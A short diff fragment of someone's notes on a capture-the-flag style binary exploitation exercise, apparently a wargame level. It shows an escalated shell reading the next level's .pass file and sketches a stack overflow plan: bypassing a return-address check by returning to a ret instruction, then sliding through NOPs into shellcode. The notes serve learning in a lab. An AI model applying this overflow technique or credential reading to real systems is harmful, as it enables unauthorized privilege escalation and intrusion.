@@ -11,3 +11,19 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>�AAAAAAAAAAAA
 $ id 
 uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
 cat /home/user/level3/.pass
+
+
+
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>x/1i $eip
+>x/8wx $esp
+>end
+
+cant ret to the stack bc of cmp 0xb000000
+so we ret to the end of the fct itself 
+then smash the next add(eip) with the stack add 
+there are no more checks here 
+slide into nops the put the shellcode 
+ 
